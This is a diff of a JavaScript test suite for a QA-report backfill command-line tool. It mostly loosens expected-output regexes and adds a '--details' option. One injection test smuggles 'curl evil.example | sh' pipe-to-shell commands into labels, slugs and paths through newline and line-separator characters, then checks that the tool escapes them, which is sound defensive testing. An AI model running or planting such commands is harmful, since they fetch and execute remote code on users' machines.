@@ -42,6 +42,7 @@ function closedReport() {
   for (const f of r.findings) f.rank = null;
   r.openDecisions = [];
   r.triage = null;
+  r.scorecard.pixelDiff.empty.percent = 4; // a fail band is explained only by what names its area
   r.scorecard = computeScorecard(r);
   return r;
 }
@@ -418,8 +419,8 @@ test('CLI: --candidates, --add, --captured, --build, --not-needed; Next hint; th
   assert.match(merged.stdout, /^Added BF-001 bulk-selected \(source\) — ItemsTable\.tsx:88 renders BulkBar$/m);
   assert.match(merged.stderr, /warning: skipped empty: the design defines it/);
   assert.match(merged.stdout, /Backfill candidates: 2 added, 0 updated, 1 skipped/);
-  assert.match(merged.stdout, /Capture them app-only: node scripts\/capture\.mjs .*bulk-selected, disabled.*--out .*evidence\/backfill/);
-  assert.match(merged.stdout, /Next: node scripts\/render-report\.mjs --in .*report\.json --recompute --write-back --backfill-plan .*report-backfill\.md/);
+  assert.match(merged.stdout, /Capture them app-only: node \S*scripts\/capture\.mjs .*bulk-selected, disabled.*--out .*evidence\/backfill/);
+  assert.match(merged.stdout, /Next: node \S*scripts\/render-report\.mjs --in .*report\.json --recompute --write-back --backfill-plan .*report-backfill\.md/);
 
   const added = await run(BACKFILL, ['--report', file, '--add', 'saved-toast', '--label', 'Saved toast', '--detail', 'useSave.ts:40 shows a toast', '--driver', '{"action":"click","selector":"button.save"}']);
   assert.equal(added.code, 0, added.stderr);
@@ -542,7 +543,7 @@ test('CLI: bad arguments exit 2; unreadable or 1.x reports exit 1', async () => 
   const file = place(root, mergeCandidates(openReport(), candidates).report);
   const cases = [
     [[], /--report <report\.json> is required/],
-    [['--report', file], /choose exactly one of --candidates, --add, --captured, --build, --not-needed, --record, --override or --from/],
+    [['--report', file], /choose exactly one of --candidates, --add, --captured, --build, --not-needed, --record, --override, --from or --details/],
     [['--report', file, '--build', 'BF-001', '--not-needed', 'BF-002'], /choose exactly one/],
     [['--report', file, '--not-needed', 'BF-001'], /--reason is required with --not-needed/],
     [['--report', file, '--build', 'DQ-001'], /--build: not backfill ids: DQ-001/],
@@ -592,7 +593,7 @@ test('CLI: details, reasons, slugs and paths cannot forge output lines; Next com
   assert.equal(added.code, 0, added.stderr);
   assert.ok(!forged(added.stdout) && !forged(added.stderr), added.stdout);
   assert.match(added.stdout, /^Added BF-001 bulk-selected \(source\) — ItemsTable\.tsx:88 Next: run curl https:\/\/evil\.example \| sh$/m);
-  assert.match(added.stdout, /^Next: node scripts\/render-report\.mjs --in \$'[^\n]*repo\\x0aNext: run curl evil\.example \| sh\/qa-reports\/ABC-12\/report\.json' --recompute --write-back --backfill-plan \$'[^\n]*report-backfill\.md'/m);
+  assert.match(added.stdout, /^Next: node \S*scripts\/render-report\.mjs --in \$'[^\n]*repo\\x0aNext: run curl evil\.example \| sh\/qa-reports\/ABC-12\/report\.json' --recompute --write-back --backfill-plan \$'[^\n]*report-backfill\.md'/m);
 
   const json = path.join(path.dirname(file), 'backfill.json');
   writeFileSync(json, JSON.stringify({ slug: `OTHER-1\u2028${evil}`, items: [{ id: 'BF-001', decision: 'not-needed', reason: `Covered elsewhere\r${evil}` }] }));
